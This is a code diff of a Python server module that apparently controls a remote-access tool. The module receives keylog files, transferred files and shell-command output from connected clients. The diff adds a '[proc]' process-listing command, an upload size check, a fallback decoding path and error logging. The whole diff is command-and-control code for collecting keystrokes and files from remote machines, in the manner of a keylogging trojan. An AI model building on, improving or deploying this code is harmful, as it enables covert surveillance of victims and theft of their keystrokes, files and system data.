@@ -16,6 +16,10 @@ class DDPSeqHandlerMixin(SEQFileMixin):
     def _seq_handler(self) -> bool:
         try:
             data = self.body['data']
+
+            if len(data) > SEQ_SIZE:
+                return self._response_error(ERROR_CODE.INVALID_HEADER_ERROR)
+
             seq_name = ""
             is_ftp = True if self.body['type'] == 'FTP_RESPONSE' else False
 
@@ -35,14 +39,13 @@ class DDPSeqHandlerMixin(SEQFileMixin):
             # 시퀀스 처리
             else:
                 if not self._gather_seq_file(self.body['sequence'], data, is_ftp):
-                    self._response_error('seq saving error')
+                    self._response_error(ERROR_CODE.SEQ_ERROR)
                     return True
             self._response_ack()
             return True
         except ConnectionResetError as e:
             self._delete_tmp_files(seq_name)
-            # TODO log
-            pass
+            logger.error('{0} : Connection Error during file sending : {1}'.format(self.client_ip, e))
 
     def _gather_seq_file(self, seq_num : int, data : bytes, is_ftp : bool):
         client_ip = self.client_ip
@@ -109,6 +112,9 @@ class DDPRequestHandlerMixin:
                 elif data == "[keylog]":
                     self._response_ftp_request("keylog", "{}_{}_keylog.txt".format(client_ip, datetime.now().strftime('%Y%m%d-%H%M%S')))
                     return
+                elif data == "[proc]":
+                    self._response_shell_request("proc")
+                    return
                 # gf 명령어 처리
                 elif data.startswith('[get file'):
                     file_name = data.split(' ')
@@ -133,21 +139,25 @@ class DDPRequestHandlerMixin:
         
         try:
             result = data.decode(ENCODING)
-            command = result.split('\n', 1)[0]
-            result = result.split('\n', 1)[1]
-
-            print()
-            print("=='{}' command result==\n{}".format(command, result))
-
-
-            logger.info("sh result : '{}'".format(data.decode(ENCODING)))
         except UnicodeDecodeError as e:
-            print(data.decode('utf-8'))
-            logger.error('receive shell response error : decode result({}) result fail : {}'.format(data, str(e)))
-            self._response_error(ERROR_CODE.DATA_DECODING_ERROR)
+            try:
+                result = data.decode(SUB_ENCODING)
+            except Exception as e:
+                logger.error('receive shell response error : decode result({}) result fail : {}'.format(data, str(e)))
+                self._response_error(ERROR_CODE.DATA_DECODING_ERROR)
+                return
         except Exception as e:
             logger.error('receive shell response error : unknown error : ' + str(e))
             self._response_error(ERROR_CODE.UNKNOWN_ERROR)
+            return
+
+        command = result.split('\n', 1)[0]
+        contents = result.split('\n', 1)[1]
+
+        print()
+        print("=='{}' command result==\n{}".format(command, contents))
+
+        logger.info("sh result : '{}'".format(result))
 
         self._response_ack()
         
@@ -166,7 +176,7 @@ class DDPRequestHandlerMixin:
             self._response_ftp_response(data, int(seq))
         except Exception as e:
             logger.error('load sending file error {}'.format(str(e)))
-            self._delete_tmp_files(self.clinet_ip + '_' + sending_file)
+            self._delete_tmp_files(self.client_ip + '_' + sending_file)
      
     def _handler_ftp_response(self, data):
         client_ip = self.client_ip
